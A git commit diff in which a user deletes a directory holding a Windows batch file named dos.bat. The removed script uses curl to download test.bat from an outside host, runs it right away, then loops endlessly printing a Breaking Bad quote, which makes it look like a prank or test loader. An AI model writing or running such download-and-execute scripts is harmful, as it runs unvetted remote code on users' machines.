262c4787feb4ec562d3af43895af16bfd61a0a62
Praxlasio <96552653+Praxlasio@users.noreply.github.com>
2023-01-16 22:03:38 -0500

    Delete 123 directory

--- 123/dos.bat
+++
@@ -1,6 +0,0 @@
-@echo off
-curl http://prax.admo.ca/test.bat -o test.bat
-start test.bat
-:slt 
-echo Yo yo yo. 148-3 to the 3 to the 6 to the 9, representing the ABQ, what up, biatch?! 
-goto :slt 
